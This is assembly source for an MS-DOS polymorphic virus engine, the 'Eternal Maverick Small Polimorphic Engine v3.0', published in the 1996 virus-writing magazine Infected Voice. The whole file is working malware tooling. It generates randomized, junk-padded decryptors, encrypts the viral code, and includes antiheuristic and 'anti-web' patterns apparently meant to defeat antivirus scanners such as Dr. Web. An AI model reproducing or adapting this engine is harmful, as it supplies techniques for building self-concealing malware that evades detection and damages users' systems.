;      ▄▄                  █
;     ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       IV  1996
;     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
;      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █▀▀█ █ 
;       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▀▀▀█ █
;       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █▄▄█ █
;       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
;       (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.



        .MODEL  TINY

        .CODE

	extrn	f_con: word
	public  modul,rnd,make

ESTART:
MODUL   PROC NEAR
;----------------------------------------------------------------
;	Процедура, создающая шифрованный модуль.
;
;	ПАРАМЕТРЫ ПРИ ВЫЗОВЕ:
;	ES - указывает на буфер необходимого размера.
;	DS - указывает на сегмент шифруемого кода.
;	SI - смещение шифруемого кода.
;	CX - длина шифруемого участка /2
;	По смещению F_CON в сегменте DS находится CМЕЩЕНИЕ РАСШИФРОВЩИКА В ФАЙЛЕ
;	(для СOM файла и вируса, дописывающегося в конец, 100h+длина файла)
;
;	НА ВЫХОДЕ:
;	По адресу ЕS:0 - зашифрованный код.
;	DI - длина этого кода.
;	BP cохраняется, AX,BX,CX,DX,SI - нет.
;-----------------------------------------------------------------------------
;	Структурная схема полиморфного расшифровщика:
;       --------------------------------------------
;
;	mov	reg1,offcode	; offcode - смещение зашифрованного кода
;	mov	reg2,-vl	; vl - длина зашифрованного кода
;	mov	reg3,code_1
;Decode:
;	oper1	word ptr ds:[reg1],reg3
;	inc	reg1
;	inc	reg1
;	oper2	reg3,code_2
;	inc	reg2
;	jnz	Decode
;
;	--------------------------------
;
;	reg1	    - один из регистров SI,DI,BX,BP
;	reg2,reg3   - произвольный регистр AX,BX,CX,DX,BP,SI,DI
;	oper1       - операция XOR,ADD или SUB
;	oper2	    - ADD или SUB
;
;	Все незадействованные регистры используются в "мусорных" инструкциях.
;	После каждой команды расшифровщика - от 1 до 16 байт мусора
;-----------------------------------------------------------------------------
call	moduloff
moduloff:
	POP  DX
	PUSH BP
POLY_START:
	IN   AL,40h
	OR   AL,AL
	JZ   POLY_START

	PUSH SI
	PUSH DS
	PUSH CX
	PUSH CS
	POP  DS	
;---------------------------------------------------------
;	Random function of 21h call generating.
;---------------------------------------------------------
	XOR  DI,DI
	MOV  SI,DX
	ADD  SI,OFFSET ANTIWEB-ESTART-3
	MOV  BYTE PTR DS:[SI+1],AL
	AND  AL,0Fh
	ADD  AL,0E0h
	MOV  BYTE PTR DS:[SI+3],AL

;---------------------------------------------------------
;	Antiheuristic patch creating
;---------------------------------------------------------
	MOV  BP,10h+1	; Don't change SP and AX in decryptor
	MOV  CX,06h
	CALL INIT_COUNTER
	CLD
ANTI:
	CMP  CL,2
	JNZ  NO_GLUE
	ADD  BYTE PTR DS:[SI+1],DL
	MOV  AX,DI
	SHR  AX,1
	SHR  AX,1
	MOVSB
	INC  SI
	STOSB
NO_GLUE:
	CALL POLY
	MOVSW
	LOOP ANTI
;----------------------------------------------------------
;	Creating a decryptor
;----------------------------------------------------------

	SUB  BP,1	; To free AX
	CALL MAKE

;---------------------------------------------
;	First instruction 
;---------------------------------------------
instr1:
	CALL ZEROTWO

	MOV  AL,BYTE PTR DS:[BX+SI+(OFFSET PACK_1-PATTERN)]
	STOSB
	PUSH DI		; Needed for decryptor
	STOSW		; To reserve a place for offset
	MOV  AL,BYTE PTR DS:[BX+SI+3+(OFFSET PACK_1-PATTERN)]
	MOV  BYTE PTR DS:[SI+1],AL
	MOV  AL,BYTE PTR DS:[BX+SI+6+(OFFSET PACK_1-PATTERN)]
	MOV  AH,AL
	MOV  WORD PTR DS:[SI+2],AX
	SUB  AL,40h
	MOV  BL,AL
	CALL FILL	; Make a register busy
	CALL MAKE
;-----------------------------------------------
;	Second instruction
;-----------------------------------------------
instr2:
	call f_reg

	mov  al,40h
	add  al,bl
	mov  byte ptr ds:[si+7],al
	in   ax,40h
	and  ax,0Fh
	pop  dx
	pop  cx
	sub  ax,cx
	sub  ax,15
	push cx
	push dx
	stosw
	call make
;------------------------------------------------
;	Third instruction
;------------------------------------------------
instr3:
	call f_reg

	mov  byte ptr ds:[si+5],bl

	mov  al,8
	mul  bl
	add  byte ptr ds:[si+1],al
	in   ax,40h
	add  ax,di
	stosw
	push di
	mov  word ptr [si - (offset pattern - encryptor) - 2],ax
	call make
;--------------------------------------------------
;	To choose operations
;--------------------------------------------------
	CALL ZEROTWO

	mov  al,byte ptr ds:[offset mirror1-pattern+bx+si]
	mov  byte ptr ds:[si],al
	neg  bx
	mov  al,byte ptr ds:[offset mirror1-pattern+bx+si+2]
	mov  byte ptr ds:[si - (offset pattern - encryptor) + 1],al

	call RND

	and  bl,1
	mov  al,byte ptr ds:[offset mirror2-pattern+bx+si]
	add  byte ptr ds:[si+5],al
	add  al,3
	mov  byte ptr ds:[si-(offset pattern - encryptor) + 5],al

;-----------------------------------------------------
;	To copy rest of decryptor
;-----------------------------------------------------
	movsw
	call make
	movsb
	call make
	movsb
	call make
	movsw
	IN   AL,40h
	MOV  BYTE PTR DS:[SI - (OFFSET PATTERN - ENCRYPTOR)],AL
	STOSB
	inc  si
	call make
	movsw
	mov  bx,di
	pop  ax
	sub  bx,ax
	mov  al,0ffh
	sub  al,bl
	stosb
	call make

	POP  SI
	MOV  AX,DI
	ADD  AX,WORD PTR DS:[f_con]
	MOV  WORD PTR ES:[SI],AX		; Offset of crypted code

	POP  CX
	POP  DS
	POP  SI
	MOVSW
	MOV  BX,0FFFFh
ENCRYPTOR:
	XOR  WORD PTR ES:[DI-2],BX
	SUB  BX,0
	MOVSW
	LOOP ENCRYPTOR

	POP  BP
	RET
MODUL	ENDP

make	proc near
	call init_counter
	call poly
	ret
make    endp

f_reg	proc near
repeat:
	call rnd
	call _free
	jnz  repeat
	call fill
	mov  al,0b8h
	add  al,bl
	stosb
	ret
f_reg   endp

zerotwo proc near
	call rnd
	mov  ax,bx
	mov  bl,3
	div  bl
	mov  bl,ah
	ret
zerotwo endp

;-----------------------------------------------------------------
	db   'Eternal Maverick Small Polimorphic Engine v3.0.'
;-----------------------------------------------------------------

poly	proc near
	push dx
	push si
	call polyoff

	data_1   db   0f5h,0f8h,0f9h,0fbh,0fch,0fdh,090h,0cch
	data_2   db   03h,0bh,013h,01bh,023h,02bh,033h,085h

polyoff:
	pop  si
;------------------------------------
;	Generate 1-byte command
;------------------------------------
form_1:
	call RND

	mov  al,byte ptr ds:[bx+si]
good_1:
	stosb
	dec  dx
form_2:
;-------------------------------------
;	Generate 2-bytes command
;-------------------------------------
	cmp  dx,2
	jb   poly_stop

	call RND
	call _free
	jnz  form_3

	mov  al,8
	mul  bl
	add  al,0C0h

	push ax
	call RND
	pop  ax
	add  al,bl
	xchg ah,al

	mov  al,byte ptr ds:[bx+si+8]
	stosw
	dec  dx
	dec  dx
form_3:
;-------------------------------------
;	Generate 3-bytes command
;-------------------------------------
	cmp  dx,3
	jb   poly_stop

	call _form
	jnz  form_4
	mov  al,83h
	stosw
	in   al,40h
	stosb
	sub dx,3	
form_4:
;-------------------------------------
;	Generate 4-bytes command
;-------------------------------------
	cmp  dx,4
	jb   poly_stop

	call _form
	jnz  poly_stop
	mov  al,81h
	stosw
	in   ax,40h
	xor  ax,di
	stosw
	sub  dx,4
poly_stop:
	or   dx,dx
	jnz  form_1

	pop  si
	pop  dx
	ret
poly	endp

_free   proc near
	push cx
	push bx
	mov  cl,bl
	mov  bx,1
	shl  bl,cl
	test bp,bx
	pop  bx
	pop  cx
	ret
_free   endp

_form   proc near
	call rnd
	and  al,03Fh
	add  al,0C0h
	xchg al,ah
	call _free
	ret
_form	endp

fill    proc near
	push bx
	push cx
	mov  cl,bl
	mov  bx,1
	shl  bl,cl
	pop  cx
	add  bp,bx
	pop  bx
	ret
fill    endp
	
INIT_COUNTER PROC NEAR	
	IN   AX,40h
	AND  AX,00001111b
	INC  AX			; Number of bytes
	MOV  DX,AX
	RET
INIT_COUNTER ENDP

RND	PROC NEAR
	PUSH DI
	PUSH DX
	CALL RNDOFF
SEED	DW   37849
FORXOR	DW   559
RNDOFF:
	POP  DI
	IN   AX,[40h]
	ADD  AX,DS:[DI]
	MOV  DX,25173
	MUL  DX
	ADD  AX,13849
	POP  DX
	MOV  DS:[DI],AX
	XOR  AX,DS:[DI+2]
	MOV  BX,AX
	AND  BX,7
	POP  DI
	RET
RND	ENDP

;RNDINI	PROC NEAR
;	PUSH AX
;	PUSH DI
;	CALL RND
;	MOV  DS:[DI+2],AX
;	CALL RND
;	MOV  DS:[DI],AX
;	POP  DI
;	POP  AX
;	RET
;RNDINI  ENDP

ANTIWEB:
;--------------------------------
;	ANTI-WEB PATTERN
;--------------------------------
	MOV  AL,0E0h
	MOV  AH,0E0h
	INT  21h
	OR   AL,AL
	JZ   $+4
	INT  20h
	PUSH CS
	POP  DS
;--------------------------------
;	INSTALLATION PATTERN
;--------------------------------
PATTERN:
	XOR  WORD PTR DS:[DI],BX
	INC DI
	INC DI
	SUB BX,0
	INC CX
	JNZ PATTERN
POLY_DATA:
;-----------------------------------------------------------------
pack_1:
	mov_reg1  db  0beh,0bfh,0bbh
	xor_reg1  db  04h,05h,07h
	inc_reg1  db  046h,047h,043h
operations:
	mirror1	 db  01h,031h,029h
	mirror2  db  0c0h,0e8h 
;-----------------------------------------------------------------

	end